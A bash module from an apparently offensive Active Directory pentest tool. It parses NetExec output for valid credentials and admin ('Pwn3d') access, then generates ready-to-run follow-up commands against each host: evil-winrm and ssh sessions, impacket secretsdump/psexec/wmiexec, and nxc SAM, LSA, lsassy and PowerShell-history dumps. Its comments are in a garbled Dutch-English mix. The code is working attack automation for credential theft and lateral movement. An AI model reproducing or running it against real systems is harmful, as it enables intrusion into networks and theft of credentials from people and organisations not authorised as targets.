#!/bin/bash
# MODULE: creds.sh - Credential parsing, extraction, live command emission

normalize_nxc_userpart() {
    local up="$1"
    # Ik normaliseer user_part uit NXC zodat parsing niet stuk gaat op escaped backslashes.
    up="${up//\\\\/\\}"
    printf '%s' "$up"
}

parse_cred_line() {
    local line="$1"
    [[ "$line" != *"[+]"* ]] && return 2
    [[ "$line" == *"Dumping"* || "$line" == *"Getting"* || "$line" == *"Brut"* ]] && return 2
    [[ "$line" == *"AS-REP"* || "$line" == *"Attempting"* ]] && return 2
    
    local cred_part
    cred_part=$(printf '%s' "$line" | sed 's/.*\[+\] *//' | awk '{print $1}')
    # Check for domein\: patroon (null-sessie)
    [[ "$cred_part" =~ ^[^:]+\\:$ ]] && return 1
    # Check if no colon at all
    [[ "$cred_part" =~ ^[^:]+$ ]] && [[ "$cred_part" != *":"* ]] && return 2
    
    local user_part secret_part username
    user_part=$(printf '%s' "$cred_part" | cut -d':' -f1)
    user_part=$(normalize_nxc_userpart "$user_part")
    user_part=$(normalize_nxc_userpart "$user_part")
    user_part=$(normalize_nxc_userpart "$user_part")
    secret_part=$(printf '%s' "$cred_part" | cut -d':' -f2-)
    
    # Haal gebruikersnaam from domein\user format using parameter expansion
    if [[ "$user_part" == *'\'* ]]; then
        username="${user_part#*\\}"
    else
        username="$user_part"
    fi
    
    [[ -z "$username" ]] && return 1
    [[ -z "$secret_part" ]] && return 1
    return 0
}

extract_creds() {
    local line="$1" cred_type="$2"
    parse_cred_line "$line" || return
    
    local proto ip cred_part user_part secret domain user
    proto=$(printf '%s' "$line" | awk '{print $1}')
    ip=$(printf '%s' "$line" | awk '{print $2}')
    cred_part=$(printf '%s' "$line" | sed 's/.*\[+\] *//' | awk '{print $1}')
    user_part=$(printf '%s' "$cred_part" | cut -d':' -f1)
    secret=$(printf '%s' "$cred_part" | cut -d':' -f2-)
    domain=""
    user=""
    
    # Handle domein\user format - use parameter expansion to avoid escape issues
    if [[ "$user_part" == *'\'* ]]; then
        domain="${user_part%%\\*}"
        user="${user_part#*\\}"
    else
        user="$user_part"
    fi
    
    # GELDIGEATION: Sla over ingeldige gebruikersnamen
    # Sla over bestandspaden that were foutnly treated as gebruikersnamen
    [[ "$user" == *".txt" || "$user" == *".lst" || "$user" == *"/" ]] && return
    # Sla over empty gebruikersnamen
    [[ -z "$user" ]] && return
    # Sla over tool-uitvoer artifacts
    [[ "$user" == "[*]" || "$user" == "[-]" || "$user" == "[+]" ]] && return
    [[ "$user" == "impacket" || "$user" =~ ^[0-9]+\.[0-9]+ ]] && return
    
    # Sla over alleen-guest toegang (not echte credentials)
    if [[ "$line" == *"(Guest)"* ]]; then
        # Alleen sla over if it's GUEST access without Pwn3d
        [[ "$line" != *"Pwn3d"* ]] && return
    fi
    
    [[ -z "$DOMAIN" && -n "$domain" ]] && DOMAIN="$domain"
    
    local pwned="no"
    [[ "$line" == *"Pwn3d"* ]] && pwned="yes"
    
    # Haal additional access info (shell access, etc.)
    local access_info=""
    [[ "$line" == *"Shell access"* ]] && access_info="shell"
    [[ "$line" == *"(admin)"* ]] && access_info="admin"
    
    local entry="$proto|$ip|$domain|$user|$secret|$pwned|$cred_type|$access_info"
    
    # Bewaar EVERY geldige credential per protocol+ip+user+secret (not just user+secret)
    local unique_key="$proto|$ip|$user|$secret"
    grep -qF "$unique_key" "$CREDS_FILE" 2>/dev/null || echo "$entry" >> "$CREDS_FILE"
}



# ============================================================================
# QUICK COMMAND HINTS (ik buffer shell/admin hints op basis van gevonden credentials)
# ============================================================================
declare -A LIVE_CMD_SEEN 2>/dev/null

emit_live_commands_from_line() {
    local line="$1"
    local cred_type="${2:-password}"

    parse_cred_line "$line" || return 0

    local proto ip cred_part user_part secret domain user pwned access_info
    proto=$(printf '%s' "$line" | awk '{print $1}')
    ip=$(printf '%s' "$line" | awk '{print $2}')
    cred_part=$(printf '%s' "$line" | sed 's/.*\[+\] *//' | awk '{print $1}')
    user_part=$(printf '%s' "$cred_part" | cut -d':' -f1)
    secret=$(printf '%s' "$cred_part" | cut -d':' -f2-)

    domain=""
    user="$user_part"
    if [[ "$user_part" == *'\'* ]]; then
        domain="${user_part%%\\*}"
        user="${user_part#*\\}"
    fi

    [[ -z "$user" ]] && return 0
    [[ "$user" == *".txt" || "$user" == *".lst" || "$user" == *"/"* ]] && return 0

    pwned="no"
    [[ "$line" == *"Pwn3d"* ]] && pwned="yes"

    access_info=""
    [[ "$line" == *"Shell access"* ]] && access_info="shell"
    [[ "$proto" == "SSH" ]] && access_info="shell"

    # Alleen print shell/admin hints when actionable (shell or Pwn3d)
    [[ "$pwned" != "yes" && "$access_info" != "shell" ]] && return 0

    # Ik houd label en command-user gescheiden:
    # - label_user laat ik als DOMAIN\\user zien voor context
    # - cmd_user gebruik ik voor tools zoals evil-winrm / nxc -u (die meestal alleen username verwachten)
    local label_user="$user"
    [[ -n "$domain" ]] && label_user="${domain}\\${user}"
    local cmd_user="$user"
    cmd_user="${cmd_user#*\\}"

    local key="$proto|$ip|$label_user|$secret|$cred_type|$pwned|$access_info"
    [[ -n "${LIVE_CMD_SEEN[$key]}" ]] && return 0
    LIVE_CMD_SEEN[$key]=1

    local auth_winrm="" auth_nxc="" auth_impacket="" auth_impacket_hash=""
    if [[ "$cred_type" == "hash" ]]; then
        auth_winrm="-H '$secret'"
        auth_nxc="-H '$secret'"
        auth_impacket_hash="-hashes :$secret"
        if [[ -n "$domain" ]]; then
            auth_impacket="'$domain/$user@$ip'"
        else
            auth_impacket="'$user@$ip'"
        fi
    else
        auth_winrm="-p '$secret'"
        auth_nxc="-p '$secret'"
        if [[ -n "$domain" ]]; then
            auth_impacket="'$domain/$user:$secret@$ip'"
        else
            auth_impacket="'$user:$secret@$ip'"
        fi
    fi

    # Buffer shell-alleen snelle commandoo's for the end of the *current fase*.
    # We do this to avoid flooding the console during spraying.
    queue_phase_cmd "# QUICK SHELL COMMANDS (from ${proto} success) -> ${label_user} @ ${ip}"
    if [[ "$proto" == "WINRM" ]]; then
        queue_phase_cmd "evil-winrm -i ${ip} -u '${cmd_user}' ${auth_winrm}"
    elif [[ "$pwned" == "yes" ]]; then
        # Only queue evil-winrm if WinRM port is actually detected open
        if [[ -s "${OUTDIR:-/tmp}/targets_winrm.txt" ]]; then
            queue_phase_cmd "evil-winrm -i ${ip} -u '${cmd_user}' ${auth_winrm}"
        fi
    fi
    if [[ "$proto" == "SSH" || "$access_info" == "shell" ]]; then
        if [[ "$cred_type" == "password" ]]; then
            queue_phase_cmd "ssh '${user}@${ip}'   # password: ${secret}"
        else
            queue_phase_cmd "ssh '${user}@${ip}'   # hash: ${secret} (if supported)"
        fi
    fi

    if [[ "$pwned" == "yes" ]]; then
        # secretsdump / psexec / wmiexec all need SMB (445) — only queue when port open
        if [[ -s "${OUTDIR:-/tmp}/targets_smb.txt" ]]; then
        if [[ "$cred_type" == "hash" ]]; then
            queue_phase_cmd "impacket-secretsdump ${auth_impacket_hash} ${auth_impacket}"
            queue_phase_cmd "impacket-psexec ${auth_impacket_hash} ${auth_impacket}"
            queue_phase_cmd "impacket-wmiexec ${auth_impacket_hash} ${auth_impacket}"
        else
            queue_phase_cmd "impacket-secretsdump ${auth_impacket}"
            if [[ -s "${OUTDIR:-/tmp}/targets_smb.txt" ]]; then
                queue_phase_cmd "impacket-psexec ${auth_impacket}"
                queue_phase_cmd "impacket-wmiexec ${auth_impacket}"
            fi
        fi
            queue_phase_cmd "sudo nxc smb ${ip} -u '${cmd_user}' ${auth_nxc} --sam"
            queue_phase_cmd "sudo nxc smb ${ip} -u '${cmd_user}' ${auth_nxc} --lsa"
            queue_phase_cmd "sudo nxc smb ${ip} -u '${cmd_user}' ${auth_nxc} --local-auth --sam"
            queue_phase_cmd "sudo nxc smb ${ip} -u '${cmd_user}' ${auth_nxc} --local-auth --lsa"
            queue_phase_cmd "sudo nxc smb ${ip} -u '${cmd_user}' ${auth_nxc} --local-auth -M lsassy"
            queue_phase_cmd "sudo nxc smb ${ip} -u '${cmd_user}' ${auth_nxc} --local-auth -M powershell_history"
        fi  # end SMB port open check
    fi
}
